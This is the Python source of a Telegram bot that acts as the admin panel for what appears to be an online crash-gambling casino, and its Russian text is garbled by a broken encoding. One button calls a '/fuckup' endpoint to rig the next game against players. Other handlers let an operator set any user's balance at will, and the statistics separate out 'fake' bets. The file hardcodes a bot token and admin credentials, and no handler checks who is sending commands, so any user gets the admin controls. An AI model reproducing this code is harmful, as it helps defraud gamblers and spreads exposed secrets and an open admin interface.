from aiogram import Bot, Dispatcher, types
from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
from aiogram.enums import ParseMode
from aiogram.types import MenuButtonWebApp, WebAppInfo
from aiogram.filters import Command
import asyncio
import requests
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
TOKEN = '7006701541:AAFk2DBM_wW2ZYUzFU0sx3QXtf4PWue2ooU'



dp = Dispatcher()

def create_play_button(invitation_code=''):
    builder = InlineKeyboardBuilder()
    builder.button(text='–ò–≥—Ä–∞—Ç—åüöÄ', web_app=WebAppInfo(url= f'https://host.yuriyzholtov.com/{invitation_code}'))
    return builder

def create_buttons_for_admin():
    builder = ReplyKeyboardBuilder()
    builder.button(text='–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞')
    builder.button(text='–°–ª–∏–≤')
    builder.button(text='–ü–æ–º–µ–Ω—è—Ç—å –±–∞–ª–∞–Ω—Å —é–∑–µ—Ä—É')
    return builder
""" üöÄ """

def create_buttons_for_detailed_stats():
    builder = InlineKeyboardBuilder()
    builder.button(text='–ü–æ–∫–∞–∑–∞—Ç—å —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –ø–æ —Å—Ç–∞–≤–∫–∞–º–∏', callback_data='show_stats_about_bets')
    builder.button(text='–ü–æ–∫–∞–∑–∞—Ç—å —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –ø–æ –∏–≥—Ä–∞–º', callback_data='show_stats_about_games')
    builder.button(text='–ü–æ–∫–∞–∑–∞—Ç—å —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –ø–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º', callback_data='show_stats_about_users')
    builder.adjust(1,1,1)
    return builder
    
@dp.message(lambda msg : msg.text == '–°–ª–∏–≤')
async def fuck_up_next_game( message:  types.Message):
    data = {"login":"admin", "password":"DHICvBAAS0ue"}
    resp = requests.post('https://host.yuriyzholtov.com/authadmin',json=data)
    cookie = resp.cookies.get('aero')
    cookies ={
        "aero":cookie
    }

    resp1 = requests.post('https://host.yuriyzholtov.com/fuckup', cookies=cookies)
  
    answer_from_server = resp1.json()
    is_ok = answer_from_server['is_ok']
    if is_ok:
        await message.answer('–°–ª–µ–¥—É—é—â–∞—è –∏–≥—Ä–∞ –±—É–¥–µ—Ç —Å–ª–∏—Ç–∞!')
        return  
    await message.answer('–ß—Ç–æ —Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫...')
    return 


class States(StatesGroup):
    first = State()
    second = State()

@dp.message(States.first)
async def input_num(message:  types.Message, state: FSMContext):
    try:
        num = int(message.text)
        data = {"login":"admin", "password":"DHICvBAAS0ue"}
        data = {"login":"admin", "password":"DHICvBAAS0ue"}
        resp = requests.post('https://host.yuriyzholtov.com/authadmin',json=data)
        cookie = resp.cookies.get('aero')
        cookies ={
            "aero":cookie
        }

        resp1 = requests.post('https://host.yuriyzholtov.com/changebalanceforuser', cookies=cookies, json={"user_id":num})
         
        answer_from_server = resp1.json()
        if answer_from_server['is_ok']:
            
            await state.set_state(States.second)
            await state.set_data({'user_id':num})
            return  await message.answer('–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –∂–µ–ª–∞–µ–º—É—é —Å—É–º–º—É –±–∞–ª–∞–Ω—Å–∞')
        return  await message.answer('–ß—Ç–æ —Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫...')
    except Exception as ex:
        print(ex)
        return await message.answer('–í—ã –≤–≤–µ–ª–∏ –Ω–µ —á–∏—Å–ª–æ!–ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É –µ—â–µ —Ä–∞–∑')


@dp.message(States.second)
async def input_num2(message:  types.Message, state: FSMContext):
    try:
        amount = int(message.text)
        data = {"login":"admin", "password":"DHICvBAAS0ue"}
        data = {"login":"admin", "password":"DHICvBAAS0ue"}
        resp = requests.post('https://host.yuriyzholtov.com/authadmin',json=data)
        cookie = resp.cookies.get('aero')
        cookies ={
            "aero":cookie
        }
        result = (await state.get_data())['user_id']
   
        resp1 = requests.post('https://host.yuriyzholtov.com/changebalanceforuser2', cookies=cookies, json={"user_id":result, "amount":amount})
    
        answer_from_server = resp1.json()
        if answer_from_server['is_ok']:
            return  await message.answer('–£—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω –±–∞–ª–∞–Ω—Å!')
        return  await message.answer('–ß—Ç–æ —Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫...')
    except:
        return await message.answer('–í—ã –≤–≤–µ–ª–∏ –Ω–µ —á–∏—Å–ª–æ!–ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É –µ—â–µ —Ä–∞–∑')
    finally:
        await state.clear()
@dp.message(lambda msg : msg.text == '–ü–æ–º–µ–Ω—è—Ç—å –±–∞–ª–∞–Ω—Å —é–∑–µ—Ä—É')
async def fuck_up_next_game( message:  types.Message, state: FSMContext):
    data = {"login":"admin", "password":"DHICvBAAS0ue"}
    resp = requests.post('https://host.yuriyzholtov.com/authadmin',json=data)
    cookie = resp.cookies.get('aero')
    cookies ={
        "aero":cookie
    }

    resp1 = requests.post('https://host.yuriyzholtov.com/get_users', cookies=cookies)
  
    answer_from_server = resp1.json()
    if answer_from_server['is_ok']:
        users_data = answer_from_server['users_data']
        msg = ''
        for user in users_data:
            msg += f'''\n {user['id']}) telegram_id = {user['telegram_id']} , username = {user['username']} , deposit_balance = {user['deposit_balance']}'''
        await message.answer(msg)
        await state.set_state(States.first)
            
        await message.answer('–æ—Ç–ø—Ä–∞–≤—å—Ç–µ –Ω–æ–º–µ—Ä –ø–æ–¥ –∫–æ—Ç–æ—Ä—ã–º –Ω–∞—Ö–æ–¥–∏—Ç—Å—è —é–∑–µ—Ä –∫–æ—Ç–æ—Ä–æ–º—É –≤—ã —Ö–æ—Ç–∏—Ç–µ –ø–æ–º–µ–Ω—è—Ç—å –±–∞–ª–∞–Ω—Å')

        return
    return  await message.answer('–ß—Ç–æ —Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫...')

@dp.message(lambda msg : msg.text == '–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞')
async def show_stats(message:  types.Message):
    data = {"login":"admin", "password":"DHICvBAAS0ue"}
    resp = requests.post('https://host.yuriyzholtov.com/authadmin',json=data)
    cookie = resp.cookies.get('aero')
    cookies ={
        "aero":cookie
    }

    resp1 = requests.post('https://host.yuriyzholtov.com/get_stats', cookies=cookies)
  
    stats = resp1.json()
    bets_data = stats['bets_data']
    games_data = stats['games_data']
    settings = stats['settings']
 
    users_data = stats['users_data']
    await message.answer(f'''
–î–∞–Ω–Ω—ã–µ –ø—Ä–∏–≤–µ–¥–µ–Ω—ã —Å–Ω–∏–∑—É
–ü—Ä–∏–±—ã–ª—å - {settings['profit_money']} —Ä—É–±–ª–µ–π
–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –¥–ª—è —Å—Ç–∞–≤–∫–∏ - {settings['min_bet']} —Ä—É–±–ª–µ–π
–ö–æ–º–∏—Å—Å–∏—è –¥–ª—è –≤—ã–≤–æ–¥–∞ - {settings['jackpot_comission']} —Ä—É–±–ª–µ–π
–ü–µ—Ä–µ—Ä—ã–≤ –º–µ–∂–¥—É –∏–≥—Ä–∞–º–∏ - {settings['crash_timer']} —Å–µ–∫—É–Ω–¥                       
                         ''', reply_markup=create_buttons_for_detailed_stats().as_markup())
    
@dp.callback_query(lambda query: query.data.startswith('show_stats_about_'))
async def handle_detailed_stats(query:types.CallbackQuery):
    data = {'login':'admin', 'password':'DHICvBAAS0ue'}
    resp = requests.post('https://host.yuriyzholtov.com/authadmin',json=data)
    cookie = resp.cookies.get('aero')
    cookies ={
        "aero":cookie
    }
    resp1 = requests.post('https://host.yuriyzholtov.com/get_stats', cookies=cookies)
    stats = resp1.json()
    bets_data = stats['bets_data']
    games_data = stats['games_data']
    settings = stats['settings']
    users_data = stats['users_data']
    data_about = query.data.split('_')[-1]
    print(data_about)
    
    if data_about == 'bets':
        if bets_data:
            all_dep_prices = []
            all_bonus_prices = []
            all_dep_wons = []
            all_bonus_wons = []
            all_dep_loses = []
            all_bonus_loses = []
            for bet in bets_data:
                if not bet['fake']:
                    if bet['baltype'] == 'deposit':
                        all_dep_prices.append(bet['price'])
                        if bet['won']:
                            all_dep_wons.append(bet['won'])
                        else:
                            all_dep_loses.append(bet['price'])
                    else:
                        all_bonus_prices.append(bet['price'])
                        if bet['won']:
                            all_bonus_wons.append(bet['won'])
                        else:
                            all_bonus_loses.append(bet['price'])
            await query.message.answer(f'''

–°—É–º–º–∞ –Ω–∞ –∫–æ—Ç–æ—Ä—É—é –ª—é–¥–∏ –Ω–∞—Å—Ç–∞–≤–∏–ª–∏ —Å—Ç–∞–≤–æ–∫ (–¥–µ–ø—ã+–±–æ–Ω—É—Å—ã) = {sum(all_dep_prices) + sum(all_bonus_prices)}

–û–±—â–∞—è —Å—É–º–º–∞ —Å—Ç–∞–≤–æ–∫ —Å –¥–µ–ø –±–∞–ª–∞–Ω—Å–∞ =  {sum(all_dep_prices) }
–°—É–º–º–∞ –≤—ã–∏–≥—Ä—ã—à–µ–π —Å –¥–µ–ø –±–∞–ª–∞–Ω—Å–∞ = {sum(all_dep_wons)}
–°—É–º–º–∞ –ø—Ä–æ–∏–≥—Ä—ã—à–µ–π —Å –¥–µ–ø –±–∞–ª–∞–Ω—Å–∞ = {sum(all_dep_loses)}
–°–∞–º—ã–π –±–æ–ª—å—à–æ–π –≤—ã–∏–≥—Ä—ã—à (–¥–µ–ø –±–∞–ª–∞–Ω—Å) = {max(all_dep_wons) if all_dep_wons else None}
–°–∞–º—ã–π –±–æ–ª—å—à–æ–π –ø—Ä–æ–∏–≥—Ä—ã—à (–¥–µ–ø –±–∞–ª–∞–Ω—Å) = {max(all_dep_loses) if all_dep_loses else None}


–û–±—â–∞—è —Å—É–º–º–∞ —Å—Ç–∞–≤–æ–∫ —Å –±–æ–Ω—É—Å –±–∞–ª–∞–Ω—Å–∞ =  {sum(all_bonus_prices) }
–°—É–º–º–∞ –≤—ã–∏–≥—Ä—ã—à–µ–π —Å –±–æ–Ω—É—Å –±–∞–ª–∞–Ω—Å–∞ = {sum(all_bonus_wons)}
–°—É–º–º–∞ –ø—Ä–æ–∏–≥—Ä—ã—à–µ–π (–±–æ–Ω—É—Å –±–∞–ª–∞–Ω—Å) = {sum(all_bonus_loses)}

''')
        else:
            await query.message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –ø–æ–∫–∞ –Ω–µ –¥–µ–ª–∞–ª–∏ –Ω–∏–∫–∞–∫–∏—Ö —Å—Ç–∞–≤–æ–∫')
    elif data_about == 'games':
        if games_data:
            all_multipliers = []
            all_profits = []
            for game in games_data:
                all_multipliers.append(game['multiplier'])
                all_profits.append(game['profit'])
            await query.message.answer(f'''
–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –∏–≥—Ä–∞—Ö:
–û–±—â–µ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∏–≥—Ä - {len(games_data)}
–°–∞–º—ã–π –≤—ã—Å–æ–∫–∏–π –∫–æ–µ—Ñ—Ñ - {max(all_multipliers)}
–û–±—â–∏–π –ø—Ä–æ—Ñ–∏—Ç (—Å–æ —Å—Ç–æ—Ä–æ–Ω—ã –∫–∞–∑–∏–Ω–æ) - {sum(all_profits)}
–ü—Ä–æ—Ñ–∏—Ç —Å–∞–º–æ–π –ø—Ä–∏–±—ã–ª—å–Ω–æ–π –∏–≥—Ä—ã - {max(all_profits)}
–ü—Ä–æ—Ñ–∏—Ç —Å–∞–º–æ–π —É–±—ã—Ç–æ—á–Ω–æ–π –∏–≥—Ä—ã - {min(all_profits)}

''')
        else:
            await query.message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é –ø–æ–∫–∞ –Ω–µ—Ç—É –Ω–∏–∫–∞–∫–∏—Ö –∏–≥—Ä')
    elif data_about == 'users':
        if users_data:
            all_deposit_balances = []
            all_bonus_balances = []
            total_amount_of_money_won = []
            total_amount_of_money_losed = []
            for user in users_data:

                all_deposit_balances.append(user['deposit_balance'])
                all_bonus_balances.append(user['bonus_balance'])
                total_amount_of_money_won.append(user['total_amount_of_money_won'])
                total_amount_of_money_losed.append(user['total_amount_of_money_losed'])


            await query.message.answer(f'''
–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è—Ö:
–û–±—â–µ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —é–∑–µ—Ä–æ–≤ - {len(users_data)}
–û–±—â–∞—è —Å—É–º–º–∞ –Ω–∞ –¥–ø–æ–∑–∏—Ç–Ω—ã—Ö –±–∞–ª–∞–Ω—Å–∞—Ö —É —é–∑–µ—Ä–æ–≤ - {sum(all_deposit_balances)}
–û–±—â–∞—è —Å—É–º–º–∞ –Ω–∞ –±–æ–Ω—É—Å–Ω—ã—Ö –±–∞–ª–∞–Ω—Å–∞—Ö —É —é–∑–µ—Ä–æ–≤ - {sum(all_bonus_balances)}

–°–∞–º–∞—è –±–æ–ª—å—à–∞—è —Å—É–º–º–∞ –¥–µ–ø–æ–∑–∏—Ç–Ω–æ–≥–æ –±–∞–ª–∞–Ω—Å–∞ - {max(all_deposit_balances)}
–°–∞–º–∞—è –±–æ–ª—å—à–∞—è —Å—É–º–º–∞ –±–æ–Ω—É—Å–Ω–æ–≥–æ –±–∞–ª–∞–Ω—Å–∞ - {max(all_bonus_balances)}

–û–±—â–µ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø—Ä–æ–∏–≥—Ä–∞–Ω–Ω—ã—Ö –¥–µ–Ω–µ–≥ (–¥–ª—è —é–∑–µ—Ä–æ–≤) - {sum(total_amount_of_money_losed)}

–°–∞–º–∞—è –±–æ–ª—å—à–∞—è –ø—Ä–æ–∏–≥—Ä–∞–Ω–Ω–∞—è —Å—É–º–º–∞ - {max(total_amount_of_money_losed)}
–û–±—â–µ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –≤—ã–∏–≥—Ä–∞–Ω–Ω—ã—Ö –¥–µ–Ω–µ–≥ (–¥–ª—è —é–∑–µ—Ä–æ–≤) - {sum(total_amount_of_money_won)}
–°–∞–º—ã–π –±–æ–ª—å—à–æ–π –≤—ã–∏–≥—Ä—ã—à - {max(total_amount_of_money_won)}

''')
        else:
            await query.message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é –ø–æ–∫–∞ –Ω–µ—Ç—É —é–∑–µ—Ä–æ–≤')
    
@dp.message(Command('start'))
async def start_handler(messsage, command):
        

        await messsage.answer('üî•', reply_markup=create_buttons_for_admin().as_markup())
        if command.args:
            await messsage.answer('–î–ª—è –∑–∞–ø—É—Å–∫–∞, –Ω–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É üëá', reply_markup=create_play_button(command.args).as_markup())
    
        else:
            await messsage.answer('–î–ª—è –∑–∞–ø—É—Å–∫–∞, –Ω–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É üëá', reply_markup=create_play_button().as_markup())


async def main() -> None:
    # Initialize Bot instance with a default parse mode which will be passed to all API calls
    bot = Bot(TOKEN, parse_mode=ParseMode.HTML)
    # And the run events dispatching
    await dp.start_polling(bot)

if __name__ == '__main__':


    asyncio.run(main())
